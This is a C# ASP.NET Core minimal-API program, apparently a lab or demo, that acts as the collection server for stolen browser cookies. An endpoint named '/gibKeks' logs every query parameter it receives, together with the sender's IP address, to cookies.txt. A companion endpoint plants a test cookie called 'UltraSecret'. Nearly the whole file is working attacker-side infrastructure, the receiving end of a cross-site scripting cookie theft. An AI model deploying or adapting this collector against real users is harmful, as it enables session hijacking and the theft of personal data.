using System.Runtime.CompilerServices;
using Microsoft.AspNetCore.Http.HttpResults;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Primitives;

var builder = WebApplication.CreateBuilder(args);

// Add services to the container.
// Learn more about configuring Swagger/OpenAPI at https://aka.ms/aspnetcore/swashbuckle
builder.Services.AddEndpointsApiExplorer();
builder.Services.AddSwaggerGen();

var app = builder.Build();

// Configure the HTTP request pipeline.
if (app.Environment.IsDevelopment())
{
    app.UseSwagger();
    app.UseSwaggerUI();
}

app.UseHttpsRedirection();

var writeLock = new SemaphoreSlim(1);
app.UseStaticFiles();

app.MapGet("/setTestCookie", (HttpContext ctx) =>
{
    ctx.Response.Cookies.Append("UltraSecret", "UltraSecretValueMaybeEvenMyPhoneNumber");
    return Results.Ok();
});

app.MapGet("/gibKeks", (HttpContext ctx) =>
    {
        if (ctx.Request.Query.Keys.Count == 0) return Results.Ok();
        var cookies = new List<string>();

        foreach (var key in ctx.Request.Query.Keys)
        {
            cookies.Add($"Request from {ctx.Connection.RemoteIpAddress}");
            if (ctx.Request.Query.TryGetValue(key, out StringValues value))
            {
                cookies.Add($"{key} - {value}");
            }
            cookies.Add($"Request end from {ctx.Connection.RemoteIpAddress}");
        }

        _  = WriteToFile(cookies);
        return Results.Ok();
    }).WithName("Gib Keks")
    .WithOpenApi();

app.Run();


async Task WriteToFile(List<string> cookies)
{
    await writeLock.WaitAsync();
    foreach (var cookie in cookies)
    {
        Console.WriteLine(cookie);
    }
    await File.AppendAllLinesAsync(Path.Combine(Environment.CurrentDirectory, "cookies.txt"), cookies);
    writeLock.Release();
}
